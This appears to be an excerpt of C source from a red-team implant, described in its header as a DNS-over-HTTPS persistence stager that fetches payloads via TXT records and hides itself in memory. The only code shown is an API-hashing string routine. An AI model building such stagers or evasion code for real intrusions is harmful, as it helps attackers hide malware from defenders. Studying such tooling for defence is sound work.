/*-
 *
 * dns over http(s) persistence stager.
 * grabs a binary payload over a txt
 * record before going back to sleep
 * for a specified time.
 *
 * before going to sleep, it will try
 * to obfuscate itself in memory and
 * hide its return address.
 *
 * Copyright (c) 2021 Austin Hudson
 * Copyright (c) 2021 GuidePoint Security LLC
 *
-*/

#include "common.h"

D_SEC(B) ULONG HashString( PVOID Inp, ULONG Len )
{
	ULONG  hsh;
	PUCHAR ptr;
	UCHAR  cur;

	hsh = 5381;
	ptr = Inp;

	while ( TRUE )
	{
		cur = * ptr;

		if ( ! Len ) {
			if ( ! * ptr ) {
				break;
			};
		} else {
			if ( ( ULONG )( ptr - ( PUCHAR )Inp ) >= Len ) {
				break;
			};
			if ( ! * ptr ) {
				++ptr; continue;
			};
		};

		if ( cur >= 'a' )
			cur -= 0x20;

		hsh = ((hsh << 5) + hsh) + cur; ++ptr;
	};
	return hsh;
}; 
